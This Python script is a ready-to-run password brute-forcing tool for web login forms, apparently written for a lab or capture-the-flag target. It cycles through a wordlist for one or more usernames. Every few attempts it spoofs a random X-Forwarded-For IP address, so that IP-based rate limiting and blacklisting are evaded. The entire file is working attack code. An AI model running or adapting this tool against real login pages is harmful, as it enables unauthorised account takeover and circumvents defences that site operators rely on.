#!/usr/bin/python3
import argparse
import os
from random import randint
import requests

RATE_LIMIT = 5
RATE_LIMIT_ERROR = "Blacklist protection"
LOGIN_ERROR = "Incorrect username or password"
QUIET_MODE = False


class ScriptOptions:
    """Class that is going to store options through whole proccess.

    :url: Target url.
    :rate_limit: Petitions rate limit before been blacklisted.
    :rate_limit_error: Rate limit error string to handle.
    :login_error: Login error string to handle.
    :quiet_mode: Flag to avoid printing every attempt realized.
    """

    def __init__(self):
        self.url = ""
        self.rate_limit = RATE_LIMIT
        self.rate_limit_error = RATE_LIMIT_ERROR
        self.login_error = LOGIN_ERROR
        self.quiet_mode = QUIET_MODE

    def set_data(self, data: dict):
        self.url = data["url"]
        self.rate_limit = data["rate_limit"]
        self.rate_limit_error = data["rate_limit_error"]
        self.login_error = data["login_error"]
        self.quiet_mode = data["quiet_mode"]


default_options = ScriptOptions()


def attempt_login(creds: dict, ip: str) -> bool:
    """Performs a login using a given password.

    :param creds: Login credentials to be tried.
    :param ip: Spoof the attacker's IP address with this one.
    :return: True for a successful login, otherwise False.
    """
    headers = {"X-Forwarded-For": ip}
    target_url = default_options.url

    r = requests.post(target_url, headers=headers, data=creds)

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if default_options.rate_limit_error in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return default_options.login_error not in r.text


def random_ip() -> str:
    """Generate a random IP address.

    :return: A random IP address.
    """
    return ".".join(str(randint(0, 255)) for _ in range(4))


def print_quiet(message: str):
    """Avoid print if quiet mode has been enabled.

    :param message: String to print.
    """
    if default_options.quiet_mode is False:
        print(message)


def run(username: str, wordlist: str):
    """Start the brute force process.

    :param username: Username to be tested.
    :param wordlist: Password wordlist path.
    """

    ip: str = random_ip()
    num_attempts: int = 1
    print_quiet("======================")
    print_quiet(f"Username: \t{username}")
    for password in open(wordlist):
        if num_attempts % (default_options.rate_limit - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print_quiet(f"Attempt {num_attempts}: {ip}\t\t{password}")
        creds = {"username": username, "password": password}
        if attempt_login(
            creds,
            ip,
        ):
            print("PASSWORD FOUND!")
            print(f"Password for {username} is {password}")
            break

        num_attempts += 1


def handle_file_error(filename: str):
    """Handles error exception in case there is a problem with the file.

    :param filename: Filename.
    """
    if os.path.exists(filename):
        try:
            open(filename)
        except OSError:
            print(f"Could not open/read file: {filename}")
            exit()
    else:
        print(f"Could not open/read file: {filename}")
        exit()


def main():
    parser = argparse.ArgumentParser(description="Test")
    parser.add_argument("url", help="Target url")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-l", "--user", nargs="?", help="Username")
    group.add_argument("-L", "--userlist", nargs="?", help="Username list file")
    parser.add_argument(
        "-w", "--wordlist", nargs="?", required=True, help="Wordlist file"
    )
    parser.add_argument(
        "-r",
        "--rate_limit",
        nargs="?",
        default=RATE_LIMIT,
        help="Petitions rate limit before been blacklisted",
    )
    parser.add_argument(
        "-R",
        "--rate_limit_error",
        nargs="?",
        default=RATE_LIMIT_ERROR,
        help="Rate limit error string to handle",
    )
    parser.add_argument(
        "-e",
        "--login_error",
        nargs="?",
        default=LOGIN_ERROR,
        help="Login error string to handle",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        default=QUIET_MODE,
        help="Flag to avoid printing every attempt realized",
    )
    args = parser.parse_args()
    default_options.set_data(
        {
            "url": args.url,
            "rate_limit": args.rate_limit,
            "rate_limit_error": args.rate_limit_error,
            "login_error": args.login_error,
            "quiet_mode": args.quiet,
        }
    )
    handle_file_error(args.wordlist)
    if args.userlist:
        handle_file_error(args.userlist)
        for user in open(args.userlist):
            run(user, args.wordlist)

    else:
        run(args.user, args.wordlist)


if __name__ == "__main__":
    main()
